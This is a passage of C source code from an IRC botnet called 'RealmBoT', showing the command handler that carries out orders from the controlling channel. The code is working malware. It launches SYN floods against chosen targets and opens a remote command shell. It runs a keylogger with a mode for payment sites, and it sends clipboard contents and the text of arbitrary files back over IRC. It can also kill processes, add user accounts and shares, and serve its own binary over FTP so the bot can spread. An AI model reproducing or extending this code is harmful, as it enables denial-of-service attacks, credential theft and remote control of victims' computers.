			else if (strcmp("id", a[s]) == 0 || strcmp("irc.i", a[s]) == 0) {
				sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  Bot ID: %s.", botid);
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("reboot", a[s]) == 0) {
				sprintf(sendbuf, ((Reboot())?("RealmBoT (irc.p.l.g) .»».  Rebooting system."):("RealmBoT (irc.p.l.g) .»».  Failed to reboot system.")));
				irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("threads", a[s]) == 0 || strcmp("threads.l", a[s]) == 0) {
				TLIST tlist;
				_snprintf(tlist.chan, sizeof(tlist.chan), a[2]);
				tlist.sock = sock;
				tlist.notice = notice;
				tlist.silent = silent;
				tlist.full = ((a[s+1])?((strcmp(a[s+1],"sub") == 0)?(TRUE):(FALSE)):(FALSE));

				sprintf(sendbuf, "RealmBoT (threads.p.l.g) .»».  List threads.");
				tlist.threadnum = addthread(sendbuf, LIST_THREAD, NULL);
				if (threads[tlist.threadnum].tHandle = CreateThread(NULL, 0, &ListThread, (LPVOID)&tlist, 0, &id)) {
					while (tlist.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"RealmBoT (threads.p.l.g) .»».  Failed to start list thread, error: <%d>.", GetLastError());
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("aliases", a[s]) == 0 || strcmp("irc.al", a[s]) == 0) {
				aliaslist(sock, a[2], notice);
				addlog("RealmBoT (irc.p.l.g) .»».  Alias list.");

				return repeat;
			}
			else if (strcmp("log", a[s]) == 0 || strcmp("irc.lg", a[s]) == 0) {
				SHOWLOG showlog;
				showlog.filter[0] = '\0';
				if (x != NULL && a[s+1]) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL)
						_snprintf(showlog.filter,sizeof(showlog.filter),"%s",y);
				}
				_snprintf(showlog.chan, sizeof(showlog.chan), a[2]);
				showlog.sock = sock;
				showlog.notice = notice;
				showlog.silent = silent;

				sprintf(sendbuf, "RealmBoT (log.p.l.g) .»».  Listing log.");
				showlog.threadnum = addthread(sendbuf, LOG_THREAD, NULL);
				if (threads[showlog.threadnum].tHandle = CreateThread(NULL, 0, &ShowLogThread, (LPVOID)&showlog, 0, &id)) {
					while (showlog.gotinfo == FALSE)
						Sleep(50);
				} else
					addlogv("RealmBoT (log.p.l.g) .»».  Failed to start listing thread, error: <%d>.", GetLastError());

				return 1;
			}
			else if (strcmp("clearlog", a[s]) == 0 || strcmp("clg", a[s]) == 0) {
				clearlog(sock, a[2], notice, silent);

				return 1;
			}
			#ifndef NO_NETINFO
			else if (strcmp("netinfo", a[s]) == 0 || strcmp("ni", a[s]) == 0) {
				irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
				addlog("RealmBoT (irc.p.l.g) .»».  Network Info.");

				return repeat;
			}
			#endif

			#ifndef NO_SUPERSYN
						else if (strcmp("supersyn", a[s]) == 0) {
							SUPERSYN supersyn;
							strncpy(supersyn.ip, a[s+1], sizeof(supersyn.ip)-1);
							strncpy(supersyn.port, a[s+2], sizeof(supersyn.port)-1);
							strncpy(supersyn.length, a[s+3], sizeof(supersyn.length)-1);
							strncpy(supersyn.chan, a[2], sizeof(supersyn.chan)-1);
							supersyn.notice = notice;
							supersyn.silent = silent;
							supersyn.sock = sock;

							sprintf(sendbuf, "RealmBoT (supersyn.p.l.g) .»». Flooding: (%s:%s) for %s seconds.", a[s+1], a[s+2], a[s+3]);
							supersyn.threadnum = addthread(sendbuf,SUPERSYN_THREAD,NULL);
							if (threads[supersyn.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&supersyn, 0, &id)) {
								while(supersyn.gotinfo == FALSE)
									Sleep(50);
							} else
								sprintf(sendbuf,"RealmBoT (supersyn.p.l.g) .»». Failed to start flood thread, error: <%d>.", GetLastError());

							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return 1;
						}
			#endif
			#ifndef NO_SYSINFO
			else if (strcmp("sysinfo", a[s]) == 0 || strcmp("sys", a[s]) == 0) {
				irc_privmsg(sock, a[2], sysinfo(sendbuf, sock), notice);
				addlog("RealmBoT(irc.p.l.g) .»».  System Info.");

				return repeat;
			}
			#endif
			else if (strcmp("remove", a[s]) == 0 || strcmp("rm", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "[REALMBOT] : Goodbye idiot and nice try.", notice);
				#ifdef DEBUG_LOGGING
				closedebuglog();
				#endif
				fclosesocket(sock);
				fWSACleanup();
				uninstall();
				ExitProcess(EXIT_SUCCESS);
			}
			#ifndef NO_PROCESS
			else if (strcmp("proc.on", a[s]) == 0 || strcmp("com.ps", a[s]) == 0) {
				if (findthreadid(PROC_THREAD) > 0) {
					if (!silent) irc_privmsg(sock, a[2], "RealmBoT (processes.p.l.g) .»».  Already running.", notice);
				} else {
					LPROC lproc;
					_snprintf(lproc.chan, sizeof(lproc.chan), a[2]);
					lproc.sock = sock;
					lproc.notice = notice;
					lproc.silent = silent;
					lproc.full = FALSE;
					if (a[s+1])
						if (strcmp("full", a[s+1]) == 0)
							lproc.full = TRUE;

					sprintf(sendbuf,"RealmBoT (processes.p.l.g) .»».  Proccess list.");
					lproc.threadnum = addthread(sendbuf, PROC_THREAD, NULL);
					if (threads[lproc.threadnum].tHandle = CreateThread(NULL, 0, &listProcessesThread, (LPVOID)&lproc, 0, &id)) {
						while (lproc.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"RealmBoT (processes.p.l.g) .»».  Failed to start listing thread, error: <%d>.", GetLastError());
					addlog(sendbuf);
				}

				return 1;
			}
			#endif
			
			else if (strcmp("uptime", a[s]) == 0 || strcmp("com.up", a[s]) == 0) {
				DWORD uptime = -1, total = GetTickCount() / 1000;

				if(a[s+1])
					uptime = atoi(a[s+1]);

				if (total/86400 >= uptime || uptime == -1) {
					sprintf(sendbuf, "RealmBoT (irc.p.l.g) .»».  Uptime: %s.", Uptime());
					irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				}

				return repeat;
			}
			else if (strcmp("driveinfo", a[s]) == 0 || strcmp("com.drv", a[s]) == 0) {
				DriveInfo(sock, a[2], notice, a[s+1]);

				return 1;
			}
			else if (strcmp("testdlls", a[s]) == 0 || strcmp("com.dll", a[s]) == 0) {
				CheckDLLs(sock,a[2],notice,silent);

				return 1;
			}
			#ifdef DUMP_ENCRYPT
			else if (strcmp("encrypt", a[s]) == 0 || strcmp("enc", a[s]) == 0) {
				encryptstrings((sizeof(authost) / sizeof(LPTSTR)),(sizeof(versionlist) / sizeof(LPTSTR)),sock,a[2],notice);

				return 1;
			}
			#endif


			#ifndef NO_REMOTECMD
			else if (strcmp("opencmd",a[s]) == 0 || strcmp("cmd1", a[s]) == 0) {
				if (findthreadid(RCMD_THREAD) > 0) {
					sprintf(sendbuf ,"[REALMBOT << Remote shell already running. >>");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				} else {
					if (open_cmd(sock,a[2]) == -1)
						sprintf(sendbuf,"[REALMBOT] << Couldn't open remote shell. >>");
					else
						sprintf(sendbuf,"[REALMBOT] << Remote shell ready. >>");
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
				}

				return 1;
			}
			else if (strcmp("closecmd",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"[CMD]","Remote shell",RCMD_THREAD,a[s+1]);

				return 1;
			}
			#endif
			else if (strcmp("irc.who", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "-[Login List]-", notice);
				for (i = 0; i < MAXLOGINS; i++) {
					sprintf(sendbuf,"%d. %s",i,((masters[i][0] != '\0')?(masters[i]+1):("<Empty>")));
    				irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
				}
				addlog("RealmBoT (irc.p.l.g) .»».  Login list complete.");
			}
			else if (strcmp("getclip", a[s]) == 0 || strcmp("com.gc", a[s]) == 0) {
				if (!silent) irc_privmsg(sock, a[2], "-[Clipboard Data]-", notice);
				irc_privmsg(sock, a[2], GetClipboardText(), notice);
				addlog("RealmBoT (irc.p.l.g) .»».  Get Clipboard.");

				return repeat;
			}
			else if (strcmp("flusharp", a[s]) == 0 || strcmp("farp", a[s]) == 0) {
				if (FlushARPCache())
					_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (flushdns.p.l.g) .»».  ARP cache flushed.");
				else
					_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (flushdns.p.l.g) .»».  Failed to flush ARP cache.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("flushdns", a[s]) == 0 || strcmp("util.fdns", a[s]) == 0) {
				if (fDnsFlushResolverCache) {
					if (fDnsFlushResolverCache())
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (flushdns.p.l.g) .»».  DNS cache flushed.");
					else
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (flushdns.p.l.g) .»».  Failed to flush DNS cache.");
				} else
					_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (flushdns.p.l.g) .»».  Failed to load dnsapi.dll.");

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("currentip", a[s]) == 0 || strcmp("cip", a[s]) == 0) {
				int scanthread;
				if (a[s+1])
					scanthread = atoi(a[s+1]);
				else
					scanthread = findthreadnum(SCAN_THREAD);
				if (scanthread != 0)
					currentIP(sock, a[2], notice, scanthread);

				return repeat;
			}

			#ifndef NO_HTTPD
			else if (strcmp("httpd.on", a[s]) == 0 || strcmp("web.on", a[s]) == 0) {
				HTTPD httpd;
				httpd.port = ((a[s+1])?((atoi(a[s+1])==0)?(httpport):(atoi(a[s+1]))):(httpport));
				httpd.enabled = ((parameters['d'])?(FALSE):(TRUE));
				if (a[s+2])
					sprintf(httpd.dir, a[s+2]);
				else {
					char sysdir[MAX_PATH], drive[10];
					GetWindowsDirectory(sysdir,sizeof(sysdir));
					_splitpath(sysdir, drive, NULL, NULL, NULL);
				}
				if (httpd.dir[strlen(httpd.dir)-1] == 92)
					httpd.dir[strlen(httpd.dir)-1] = '\0';
				httpd.sock = sock;
				_snprintf(httpd.chan, sizeof(httpd.chan), a[2]);
				httpd.notice = notice;
				httpd.silent = silent;

				sprintf(sendbuf,"[REALMBOT] << Server listening on IP: %s:%d, Directory: %s\\. >>", GetIP(sock), httpd.port, httpd.dir);
				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[REALMBOT] << Failed to start server thread, error: <%d>. >>", GetLastError());

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			
			#ifndef NO_CRASH
			else if (strcmp("crash", a[s]) == 0) {
				sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Crashing bot.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				strcmp(a[s+5],"crash"); // yes, this will crash.

				return 1;
			}
			#endif
			
			else if (strcmp("ftpd.on", a[s]) == 0 || strcmp("d.ftpd.on", a[s]) == 0) {
				char sendbuf[IRCLINE];
				DWORD id;
				if (findthreadid(FTP_THREAD) == 0) {
					static FTP ftp;
//					ftp.port = lsaport;
					ftp.threads = 0;
					GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
					strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
					ftp.sock = sock;
					ftp.notice = notice;
					ftp.silent = silent;
					strncpy(ftp.chan, exploitchan, sizeof(ftp.chan)-1);
					sprintf(sendbuf, "[REALMBOT-FTP] : Server started on Port: %d, File: %s, Request: %s.", ftp.port, ftp.filename, ftp.requestname);
					ftp.threadnum = addthread(sendbuf,FTP_THREAD,NULL);
					if (threads[ftp.threadnum].tHandle = CreateThread(NULL, 0, &ftpd, (LPVOID)&ftp, 0, &id)) {
						while (ftp.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf, "[REALMBOT] : Failed to start server, error: <%d>.", GetLastError());
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
					addlog(sendbuf);
					return 1;
				} else {
					sprintf(sendbuf,"[REALMBOT] :  Server already started.");
                    irc_privmsg(sock,a[2],sendbuf,notice);
					return 1;
				}
			}
			
			// commands requiring at least 1 parameter
			else if (a[s+1] == NULL) return 1;
			else if (strcmp("irc.nick", a[s]) == 0 || strcmp("irc.n", a[s]) == 0) {
				irc_sendv(sock, "NICK %s\r\n", a[s+1]);
				addlogv("RealmBoT (irc.p.l.g) .»».  Nick changed to: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("join", a[s]) == 0 || strcmp("irc.j", a[s]) == 0) {
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+1], a[s+2]);
				addlogv("RealmBoT (irc.p.l.g) .»».  Joined channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("part", a[s]) == 0 || strcmp("irc.pt", a[s]) == 0) {
				irc_sendv(sock, "PART %s\r\n", a[s+1]);
				addlogv("RealmBoT (irc.p.l.g) .»».  Parted channel: '%s'.",a[s+1]);

				return repeat;
			}
			else if (strcmp("raw", a[s]) == 0 || strcmp("irc.ra", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "%s\r\n", y);
						addlogv("RealmBoT (irc.p.l.g) .»».  IRC Raw: %s.",y);
					}
				}

				return repeat;
			}
			else if (strcmp("killthreads", a[s]) == 0 || strcmp("killt", a[s]) == 0) {
				if (strcmp("all", a[s+1]) == 0) {
					if ((i=killthreadall()) > 0)
						sprintf(sendbuf,"RealmBoT (threads.p.l.g) .»».  Stopped: %d thread(s).", i);
					else
						sprintf(sendbuf,"RealmBoT (threads.p.l.g) .»».  No active threads found.");
					if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
					addlog(sendbuf);
				} else {
					for (i = s+1; i < (sizeof(a)/4); i++) {
						if (a[i]==NULL) break;

						if (killthread(atoi(a[i])))
							sprintf(sendbuf,"RealmBoT (threads.p.l.g) .»».  Killed thread: %s.",a[i]);
						else
							sprintf(sendbuf,"RealmBoT(threads.p.l.g) .»».  Failed to kill thread: %s.",a[i]);
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("clone.quit", a[s]) == 0 || strcmp("clone.q", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					irc_sendv(threads[atoi(a[s+1])].sock, "QUIT :later\r\n");
					Sleep(500);
					fclosesocket(threads[atoi(a[s+1])].sock);
					TerminateThread(threads[atoi(a[s+1])].tHandle, id);
					threads[atoi(a[s+1])].tHandle = 0;
					threads[atoi(a[s+1])].name[0] = '\0';
				}

				return 1;
			}
			else if (strcmp("clone.rndnick", a[s]) == 0 || strcmp("clone.rn", a[s]) == 0) {
				if (atoi(a[s+1]) > 0 && atoi(a[s+1]) < MAXTHREADS) {
					sprintf(sendbuf, "NICK %s", rndnick(ntmp));
					irc_sendv(threads[atoi(a[s+1])].sock, "%s\r\n", sendbuf);
				}

				return repeat;
			}
			else if (strcmp("prefix", a[s]) == 0 || strcmp("irc.pr", a[s]) == 0) {
				prefix = a[s+1][0];
				sprintf(sendbuf,"[REALMBOT] << Prefix changed to: '%c' >>",a[s+1][0]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("open", a[s]) == 0 || strcmp("com.o", a[s]) == 0) {
				if (fShellExecute(0, "open", a[s+1], NULL, NULL, SW_SHOW))
					sprintf(sendbuf,".15,14nzm .2.. .15(shell.2..15mod) .2».15  File opened: %s", a[s+1]);
				else
					sprintf(sendbuf,".15,14nzm .2.. .15(shell.2..15mod) .2».15  Couldn't open file: %s", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("setserver", a[s]) == 0 || strcmp("irc.se", a[s]) == 0) {
				strncpy(server,  a[s+1], 127);
				sprintf(sendbuf,"RealmBoT(irc.p.l.g) .»».  Server changed to: '%s'.",a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("dns", a[s]) == 0 || strcmp("irc.dn", a[s]) == 0) {
				LPHOSTENT hostent = NULL;
				IN_ADDR iaddr;
				DWORD addr = finet_addr(a[s+1]);

				if (addr != INADDR_NONE) {
					hostent = fgethostbyaddr((char *)&addr, sizeof(struct in_addr), AF_INET);
					if (hostent != NULL)
						sprintf(sendbuf, "[REALMBOT] << Lookup: %s -> %s. >>", a[s+1], hostent->h_name);
				}
				else {
					hostent = fgethostbyname(a[s+1]);
					if (hostent != NULL) {
						iaddr = *((LPIN_ADDR)*hostent->h_addr_list);
						sprintf(sendbuf, "[REALMBOT] << Lookup: %s -> %s. >>", a[s+1], finet_ntoa(iaddr));
					}
				}
				if (hostent == NULL)
					sprintf(sendbuf,"[REALMBOT] << Couldn't resolve hostname. >>");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}



			#ifndef NO_PROCESS
			else if (strcmp("killprocess",a[s]) == 0 || strcmp("kpc", a[s]) == 0) {  // kill process name
				if(listProcesses(sock,NULL,notice,a[s+1]) == 1)
					sprintf(sendbuf,"[REALMBOT] << Process killed: %s >>",a[s+1]);
				else
					sprintf(sendbuf,"[REALMBOT] << Failed to terminate process: %s >>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			else if (strcmp("prockillid",a[s]) == 0 || strcmp("pkid", a[s]) == 0) {  // kill process id
				if(killProcess(atoi(a[s+1])) == 1)
					sprintf(sendbuf,"[REALMBOT] << Process killed ID: %s >>",a[s+1]);
				else
					sprintf(sendbuf,"[REALMBOT] <<  Failed to terminate process ID: %s >>", a[s+1]);
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif
			else if (strcmp("delete", a[s]) == 0 || strcmp("del", a[s]) == 0) {
				if (DeleteFile(a[s+1]))
					_snprintf(sendbuf,sizeof(sendbuf),"[REALMBOT] << Deleted '%s' >>",a[s+1]);
				else
					_snprintf(sendbuf,sizeof(sendbuf),PrintError("RealmBoT (file.p.l.g) .»». "));

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return repeat;
			}
			
			else if (strcmp("list", a[s]) == 0 || strcmp("com.fl", a[s]) == 0) {
				GetFiles(a[s+1],sock,a[2],NULL);
				addlogv("RealmBoT (file.p.l.g) .»».  List: %s", a[s+1]);

				return repeat;
			}
			
			else if (strcmp("mirc.cmd", a[s]) == 0 || strcmp("mirc.cmd", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						if (!mirccmd(y))
							sprintf(sendbuf,"RealmBoT (mirc.p.l.g) .»».  Client not open.");
						else
							sprintf(sendbuf,"RealmBoT(mirc.p.l.g) .»».  Command sent.");
						if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
                }

				return repeat;
			}
			#ifndef NO_REMOTECMD
			else if (strcmp("cmd", a[s]) == 0 || strcmp("cmd1", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						strcat(y,"\n");
						if (!send_commands(y)) {
							sprintf(sendbuf,"[REALMBOT] << Error sending to remote shell >>");
							if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						}
						else
							sprintf(sendbuf,"RealmBoT (cmd.p.l.g) .»».  Commands: %s",y);
						addlog(sendbuf);
					}
				}

				return repeat;
			}
			#endif
			else if (strcmp("readfile", a[s]) == 0 || strcmp("com.rf", a[s]) == 0) {
				FILE *fp;
				if ((fp = fopen(a[s+1],"r")) != NULL) {
					while (fgets(sendbuf,sizeof(sendbuf),fp) != NULL)
						irc_privmsg(sock, a[2], sendbuf, notice, TRUE);
					fclose(fp);
					sprintf(sendbuf,"[REALMBOT] << Read file complete: %s >>",a[s+1]);
				} else {
					sprintf(sendbuf,"[REALMBOT] << Read file failed: %s >>",a[s+1]);
					if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				}
				addlog(sendbuf);

				return repeat;
			}
			
			#ifndef NO_IDENT
			else if (strcmp("ident", a[s]) == 0) {
				if (strcmp("on", a[s+1]) == 0) {
					if (findthreadid(IDENT_THREAD) > 0)
						sprintf(sendbuf ,"RealmBoT (ident.p.l.g) .»».  Already running.");
					else {
						sprintf(sendbuf,"RealmBoT (identd.p.l.g) .»».  Server running on Port: 113.");
						i = addthread(sendbuf,IDENT_THREAD,NULL);
						if ((threads[i].tHandle = CreateThread(NULL, 0, &IdentThread, (LPVOID)i, 0, &id)) == NULL)
							sprintf(sendbuf,"RealmBoT (identd.p.l.g) .»».  Failed to start server, error: <%d>.", GetLastError());
					}
				}
				else if (strcmp("off", a[s+1]) == 0) {
					if ((i=killthreadid(IDENT_THREAD)) > 0)
						sprintf(sendbuf,"RealmBoT (ident.p.l.g) .»».  Server stopped. (%d thread(s) stopped.)",i);
					else
						sprintf(sendbuf,"RealmBoT (ident.p.l.g) .»».  No thread found.");
				}
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			#endif

			#ifndef NO_KEYLOG
			else if (strcmp("keylog.on", a[s]) == 0 || strcmp("cmd.kl.on", a[s]) == 0) {
				if (findthreadid(KEYLOG_THREAD) > 0)
					sprintf(sendbuf ,"RealmBoT (keylog.p.l.g) .»».  Already running.");
				else if (a[s+1]) {
					KEYLOG keylog;
					keylog.sock = sock;
					keylog.notice = notice;
					keylog.silent = silent;
					keylog.mode = false;
					
					if(strcmp("pay", a[s+1]) == 0) {
						keylog.mode = true;
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "RealmBoT (keylog.p.l.g) .»».  Pay sites key logger active.");
					} 
					else if(strcmp("normal", a[s+1]) == 0) {
						_snprintf(keylog.chan, sizeof(keylog.chan), ((a[s+2])?(a[s+2]):((strcmp(keylogchan,"")==0)?(a[2]):(keylogchan))));
						sprintf(sendbuf, "RealmBoT (keylog.p.l.g) .»».  Normal key logger active.");
					}
					else {
						sprintf(sendbuf, "RealmBoT (keylog.p.l.g) .»».  Unknow mode type.");
						if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
						addlog(sendbuf);
						return 1;
					}
					keylog.threadnum = addthread(sendbuf, KEYLOG_THREAD, NULL);
					if (threads[keylog.threadnum].tHandle = CreateThread(NULL, 0, &KeyLoggerThread, (LPVOID)&keylog, 0, &id)) {
						while(keylog.gotinfo == FALSE)
							Sleep(50);
					} else
						sprintf(sendbuf,"RealmBoT (keylog.p.l.g) .»».  Failed to start logging thread, error: <%d>.", GetLastError());
				}
				else
					sprintf(sendbuf, "RealmBoT (keylog.p.l.g) .»».  Missing mode type.");
				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);
				return 1;
			}
			else if (strcmp("stop",a[s]) == 0 || strcmp("stop",a[s]) == 0) {
				stopthread(sock,a[2],notice,silent,"RealmBoT (keylog.p.l.g) .»».","Keylog",KEYLOG_THREAD,a[s+1]);
				return 1;
			}

			#endif
			#ifndef NO_NET
						else if (strcmp("net", a[s]) == 0) {
							if((!noadvapi32) || (!nonetapi32)) {
								if (x != NULL) {
									char *y = NULL;
									if (a[s+2]) // get the full service name if exists
										y = strstr(x, a[s+2]);
									if (strcmp("start", a[s+1]) == 0)
										if (a[s+2])
											sprintf(sendbuf, "%s", Services(NET_START, y));
										else {
											if (ListServices(sock, a[2], notice))
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  Service list completed.");
											else
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  Service list failed.");
										}
									else if (strcmp("stop", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_STOP, y));
									else if (strcmp("pause", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_PAUSE, y));
									else if (strcmp("continue", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_CONTINUE, y));
									else if (strcmp("delete", a[s+1]) == 0)
										sprintf(sendbuf, "%s", Services(NET_DELETE, y));
									else if (strcmp("share", a[s+1]) == 0) {
										if (a[s+2]) {
											if (parameters['d'])
												sprintf(sendbuf, "%s", Shares(NET_DELETE, a[s+2]));
											else
												sprintf(sendbuf, "%s", Shares(NET_ADD, a[s+2], a[s+3]));
										} else {
											if (ListShares(sock, a[2], notice))
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  Share list completed.");
											else
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  Share list failed.");
										}
									}
									else if (strcmp("user", a[s+1]) == 0) {
										if (a[s+2]) {
											if (parameters['d'])
												sprintf(sendbuf, "%s", Users(NET_DELETE, a[s+2], NULL, sock, a[2], notice));
											else {
												if (a[s+3])
													sprintf(sendbuf, "%s", Users(NET_ADD, a[s+2], a[s+3], sock, a[2], notice));
												else
													sprintf(sendbuf, "%s", Users(NET_INFO, a[s+2], NULL, sock, a[2], notice));
											}
										} else {
											if (ListUsers(sock, a[2], notice))
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  User list completed.");
											else
												sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  User list failed.");
										}
									}
									else if (strcmp("send", a[s+1]) == 0) {
										if (a[s+2])
											sprintf(sendbuf, "%s", NetSend(y, sock, a[2], notice));
										else
											sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  No message specified.");
									}
									else
										sprintf(sendbuf,"RealmBoT (net.p.l.g) .»».  Command unknown.");
								}
							} else
								sprintf(sendbuf, "RealmBoT (net.p.l.g) .»».  Failed to load advapi32.dll or netapi32.dll.");
							if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
							addlog(sendbuf);

							return repeat;
						}
			#endif
			
			else if (strcmp("gethost", a[s]) == 0 || strcmp("irc.gh", a[s]) == 0) {
				if(strstr(host, a[s+1])) {
					if (a[s+2]) {
						char *y = strstr(x, a[s+2]);
						if (y != NULL) {
							sprintf(sendbuf, "%s %s %s :%s", a[0], a[1], a[2], y);
							strncpy(line,  sendbuf, (IRCLINE-1));
							sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Gethost: %s, Command: %s", a[s+1],y);
							repeat++;
						} else
							sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Unable to extract Gethost command.");
					} else {
						irc_privmsg(sock, a[2], netinfo(sendbuf, host, sock), notice);
						_snprintf(sendbuf,sizeof(sendbuf),"RealmBoT (irc.p.l.g) .»».  Gethost: %s.",a[s+1]);
					}
					addlog(sendbuf);
				}

				return repeat;
			}

			// commands requiring at least 2 parameters
			else if (a[s+2] == NULL) return 1;
				else if (strcmp("addalias", a[s]) == 0 || strcmp("irc.aa", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						addalias(a[s+1], y);
						sprintf(sendbuf,"RealmBoT (irc.p.l.g) .»».  Alias added: %s.", a[s+1]);
						if(!silent) irc_privmsg(sock, a[2], sendbuf, notice);
						addlog(sendbuf);
					}
				}

				return 1;
			}
			else if (strcmp("privmsg", a[s]) == 0 || strcmp("irc.pm", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						irc_privmsg(sock, a[s+1], y, FALSE);
						addlogv("RealmBoT (irc.p.l.g) .»».  Privmsg: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("action", a[s]) == 0 || strcmp("irc.ac", a[s]) == 0) {
				if (x != NULL) {
					x = x + strlen(a[s]) + strlen(a[s+1]) + 2;
					char *y = strstr(x, a[s+2]);
					if (y != NULL) {
						sprintf(sendbuf, "\1ACTION %s\1", y);
						irc_privmsg(sock, a[s+1], sendbuf, FALSE);
						addlogv("RealmBoT (irc.p.l.g) .»».  Action: %s: %s.",a[s+1], y);
					}
				}

				return repeat;
			}
			else if (strcmp("cycle", a[s]) == 0 || strcmp("irc.cy", a[s]) == 0) {
				if (strcmp("332", a[1]) == 0)
					return 1;
				irc_sendv(sock, "PART %s\r\n", a[s+2]);
				Sleep(atoi(a[s+1])*1000);
				irc_sendv(sock, "JOIN %s %s\r\n", a[s+2], a[s+3]);
				addlog("RealmBoT (irc.p.l.g) .»».  Cycle.");

				return repeat;
			}
			else if (strcmp("mode", a[s]) == 0 || strcmp("irc.m", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+1]);
					if (y != NULL) {
						irc_sendv(sock, "MODE %s\r\n", y);
						addlogv("RealmBoT (irc.p.l.g) .»».  Mode change: %s",y);
					}
				}

				return repeat;
			}
			else if (strcmp("rawclone", a[s]) == 0 || strcmp("clone.ra", a[s]) == 0) {
				if (x != NULL) {
					char *y = strstr(x, a[s+2]);
